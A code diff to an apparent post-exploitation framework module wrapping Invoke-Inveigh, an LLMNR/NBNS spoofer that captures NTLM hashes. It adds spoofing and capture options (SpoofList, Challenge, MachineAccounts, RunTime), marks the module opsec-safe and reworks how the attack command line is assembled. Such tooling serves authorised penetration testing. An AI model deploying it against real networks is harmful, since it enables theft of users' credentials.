@@ -19,7 +19,7 @@ class Module:
             
             'NeedsAdmin' : True,
 
-            'OpsecSafe' : False,
+            'OpsecSafe' : True,
 
             'MinPSVersion' : '2',
             
@@ -38,17 +38,17 @@ class Module:
                 'Value'         :   ''
             },
             'IP' : {
-                'Description'   :   'A specific local IP address for listening. ',
+                'Description'   :   'Specific local IP address for listening.',
                 'Required'      :   False,
                 'Value'         :   ''
             },
             'SpooferIP' : {
-                'Description'   :   'Specify an IP address for LLMNR/NBNS spoofing.',
+                'Description'   :   'Specific IP address for LLMNR/NBNS spoofing.',
                 'Required'      :   False,
                 'Value'         :   ''
             },
-            'HTTP' : {
-                'Description'   :   'Enable/Disable HTTP challenge/response capture (Y/N).',
+            'LLMNR' : {
+                'Description'   :   'Enable/Disable LLMNR spoofing (Y/N).',
                 'Required'      :   False,
                 'Value'         :   'Y'
             },
@@ -57,25 +57,50 @@ class Module:
                 'Required'      :   False,
                 'Value'         :   'Y'
             },
-            'SMB' : {
-                'Description'   :   'Enable/Disable SMB challenge/response capture (Y/N).',
+            'NBNSTypes' : {
+                'Description'   :   'Comma separated list of NBNS types to spoof.',
                 'Required'      :   False,
-                'Value'         :   'Y'
-            },
-            'LLMNR' : {
-                'Description'   :   'Enable/Disable LLMNR spoofing (Y/N).',
-                'Required'      :   False,
-                'Value'         :   'Y'
+                'Value'         :   '00,20'
             },
             'Repeat' : {
                 'Description'   :   'Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user challenge/response has been captured (Y/N).',
                 'Required'      :   False,
                 'Value'         :   'Y'
             },
+            'SpoofList' : {
+                'Description'   :   'Comma separated list of hostnames to spoof with LLMNR and NBNS.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'HTTP' : {
+                'Description'   :   'Enable/Disable HTTP challenge/response capture (Y/N).',
+                'Required'      :   False,
+                'Value'         :   'Y'
+            },
+            'SMB' : {
+                'Description'   :   'Enable/Disable SMB challenge/response capture (Y/N).',
+                'Required'      :   False,
+                'Value'         :   'Y'
+            },
+            'Challenge' : {
+                'Description'   :   'Specific 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'MachineAccounts' : {
+                'Description'   :   'Enable/Disable showing NTLM challenge/response captures from machine accounts (Y/N).',
+                'Required'      :   False,
+                'Value'         :   'N'
+            },
             'ForceWPADAuth' : {
                 'Description'   :   'Enable/Disable LLMNR spoofing (Y/N).',
                 'Required'      :   False,
                 'Value'         :   'Y'
+            },
+            'RunTime' : {
+                'Description'   :   'Run time duration in minutes.',
+                'Required'      :   False,
+                'Value'         :   ''
             }
         }
 
@@ -107,17 +132,19 @@ class Module:
         script = moduleCode
 
         # disable file output
-        script += "\n" + 'Invoke-Inveigh -Output 1 '
+        script += "\n" + 'Invoke-Inveigh -ConsoleOutput "Y" -Tool "2" '
 
         for option,values in self.options.iteritems():
             if option.lower() != "agent":
-                if option.lower() == "nbns" and values['Value'].lower() == 'y':
-                    script += ' -NBNS Y -NBNSTypes @("00","20")'
-                elif values['Value'] and values['Value'] != '':
+                if values['Value'] and values['Value'] != '':
                     if values['Value'].lower() == "true":
                         # if we're just adding a switch
                         script += " -" + str(option)
                     else:
-                        script += " -" + str(option) + " " + str(values['Value'])
+                        if "," in str(values['Value']):
+                            quoted = '"' + str(values['Value']).replace(',', '","') + '"'
+                            script += " -" + str(option) + " " + quoted
+                        else:
+                            script += " -" + str(option) + " \"" + str(values['Value']) + "\""
 
         return script
